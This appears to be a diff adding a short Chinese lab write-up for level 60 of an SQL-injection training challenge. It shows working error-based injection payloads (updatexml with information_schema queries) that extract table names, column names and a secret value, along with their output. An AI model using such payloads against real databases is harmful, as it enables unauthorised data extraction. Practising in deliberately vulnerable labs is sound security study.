@@ -1,0 +1,20 @@
+第60关
+
+通过"）闭合
+
+报错注入
+
+爆出表名
+?id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)  --+
+xzgydq0mea
+
+爆出列名
+?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='xzgydq0mea'),0x7e),1)  --+
+
+爆出信息
+?id=1") and updatexml(1,concat(0x7e,(select group_concat(secret_2JQ0) from xzgydq0mea),0x7e),1)  --+
+zkSaw2XcJP3p3QkYdCqe1K1S
+
+
+
+闯关成功！！！
